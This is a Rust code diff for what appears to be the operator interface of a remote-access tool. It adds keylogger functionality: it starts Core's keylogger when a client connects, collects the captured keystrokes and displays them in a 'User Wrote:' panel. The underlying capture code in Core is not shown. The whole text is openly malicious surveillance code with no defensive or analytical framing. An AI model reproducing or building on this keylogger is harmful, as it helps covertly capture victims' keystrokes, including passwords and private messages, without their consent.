@@ -13,6 +13,7 @@ pub struct App {
     character_index: usize,
     messages: Vec<String>,
     instructions: Vec<String>,
+    keys: String,
     core: Core,
 }
 
@@ -23,6 +24,7 @@ impl App {
             messages: Vec::new(),
             instructions: Vec::new(),
             character_index: 0,
+            keys: String::new(),
             core: Core::new(),
         }
     }
@@ -73,6 +75,14 @@ impl App {
         self.character_index = 0;
     }
 
+    fn run_keylogger(&mut self) {
+        self.core.keylogger();
+    }
+
+    fn read_keys(&mut self) -> String {
+        self.core.keys.iter().map(|c| c.to_owned()).collect()
+    }
+
     fn submit_instructions(&mut self) {
         self.core.apply_instructions(self.input.clone()).unwrap();
         self.instructions.push(self.input.clone());
@@ -83,6 +93,8 @@ impl App {
 
     pub fn run(mut self, terminal: &mut DefaultTerminal) -> Result<()> {
         self.messages.push(format!("client is connected from {}", self.core.addr));
+
+        self.run_keylogger();
 
         loop {
             terminal.draw(|frame| self.render(frame))?;
@@ -100,7 +112,7 @@ impl App {
         }
     }
 
-    fn render(&self, frame: &mut Frame) {
+    fn render(&mut self, frame: &mut Frame) {
         let main_layout = Layout::vertical([
             Constraint::Percentage(75),
             Constraint::Percentage(25),
@@ -137,7 +149,7 @@ impl App {
             .block(Block::bordered());
         frame.render_widget(instructions, layout[1]);
 
-        let keylogger = Paragraph::new("User Wrote: ")
+        let keylogger = Paragraph::new(format!("User Wrote: {}", self.read_keys()))
             .style(Style::default().fg(Color::White))
             .block(Block::bordered());
         frame.render_widget(keylogger, layout[0]);
